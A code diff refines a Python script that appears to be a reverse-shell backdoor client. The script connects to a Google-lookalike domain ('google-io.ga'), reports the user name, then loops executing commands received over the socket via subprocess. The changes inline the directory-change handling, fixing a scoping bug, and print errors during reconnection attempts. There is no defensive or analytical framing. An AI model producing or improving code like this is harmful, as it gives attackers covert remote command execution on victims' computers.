@@ -14,10 +14,6 @@ DNS = 'google-io.ga'
 def listen_cmd(socket: socket.socket):
     cwd = os.getcwd()
 
-    def change_directory(new_path):
-        cwd = os.path.join(cwd, new_path)
-        socket.send(b'path changed')
-
     def exec_cmd(cmd):
         p = subprocess.Popen(cmd
                     , stdout=subprocess.PIPE
@@ -35,7 +31,8 @@ def listen_cmd(socket: socket.socket):
     while True:
         cmd = socket.recv(BUFFER_SIZE).decode()
         if re.search(r'^cd ', cmd):
-            change_directory(cmd[3:])
+            cwd = os.path.join(cwd, cmd[3:])
+            socket.send(b'path changed')
         else:
             exec_cmd(cmd)
 
@@ -47,6 +44,7 @@ def connect_to_host():
             s.send(USER.encode())
             listen_cmd(s)
         except Exception as e:
+            print(e)
             time.sleep(1)
 
 if __name__ == '__main__':
